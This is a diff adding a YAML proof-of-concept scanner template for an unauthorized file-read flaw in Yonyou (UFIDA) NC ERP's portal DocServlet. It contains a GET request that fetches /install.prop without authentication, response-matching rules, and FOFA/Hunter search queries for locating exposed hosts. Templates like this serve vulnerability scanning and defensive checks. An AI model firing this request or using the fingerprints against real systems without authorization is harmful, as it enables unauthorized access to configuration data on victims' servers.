@@ -1,0 +1,30 @@
+id: poc-yaml-yongyou-nc-portal-docservlet-unauthorized-resource-access
+info:
+  name: 用友NC portal_docServlet 未授权资源访问漏洞
+  severity: high
+  tags:
+  - 资源管理错误
+  finger: NC65
+  hunter: app.name="用友 UAP"
+  fofa: app="用友-UFIDA-NC"
+variables:
+  paths: 'service/~webrt/nc.uap.lfw.file.action.DocServlet
+
+    servlet/~webrt/nc.uap.lfw.file.action.DocServlet
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}?disp=/install.prop
+  expression: 'status_code == 200
+
+    && contains(body,"[CONFIG]")
+
+    && contains(body,"[STEPPANEL]")
+
+    && contains(body,"title=UFIDA ERP-NC Setup")
+
+    && !contains(body,"<")
+
+    '
+transport: http
